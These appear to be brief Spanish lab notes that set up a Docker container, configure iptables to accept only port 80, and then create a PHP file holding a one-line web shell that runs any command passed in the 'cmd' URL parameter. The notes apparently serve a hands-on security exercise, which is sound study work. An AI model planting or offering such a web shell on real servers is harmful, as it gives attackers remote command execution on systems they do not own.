
---
(Ejecutar el comando)
```
sudo docker run -dit -p 80:80 --cap-add=NET_ADMIN --name myContainer my-image
```

(Ejecutar el comando)
	docker exec -it myContainer bash 
(Ejecutoar un iptables)
iptables --flush
(Por el portocolo tcp por el puerto ochenta todas las conexiones son aceptadas)
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
(Configurar el iptables para que me anden todos los puertos excepto el que quiero)
iptables -A INPUT -p tcp --dport 0:65535 -m conntrack --ctstate NEW -j DROP

creamos el siguiente nano 
<?
        echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
?>